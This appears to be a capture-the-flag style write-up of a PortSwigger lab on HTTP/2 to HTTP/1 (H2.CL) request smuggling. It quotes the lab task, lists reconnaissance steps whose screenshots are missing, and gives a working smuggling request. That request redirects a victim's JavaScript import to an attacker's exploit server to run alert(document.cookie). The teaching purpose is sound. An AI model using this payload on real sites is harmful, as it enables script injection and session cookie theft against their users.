# H2.CL request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.

Hint: 

- Solving this lab requires a technique that we covered in the earlier HTTP request smuggling materials (https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)

- You need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.

There is a search function whose content is reflected inside an h1 element:

Searching generates a POST request with the parameter “search”:

There are requests to “/analytics” when accessing “/”:

And there are references to a Javascript file in the home page:

The content in /resources/js/analyticsFetcher.js is:

I will create this file in the exploit server:

First we see with “Content-Length: 0”, 1 of every 2 requests fails (is smuggled):

Of all the folders in the page, if we access "/resources" it redirects to "/resources/" and "/image" to "/image/"

Using this payload, we can get a redirect to "/resources" in the exploit server:

```
POST / HTTP/2
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


GET /resources HTTP/1.1
Host: exploit-0a4f00f203b90e88815a42a701ee00bd.exploit-server.net
Content-Length: 10

a

```

We can change the path of the payload in the exploit server so it is accessible in “/resources”:
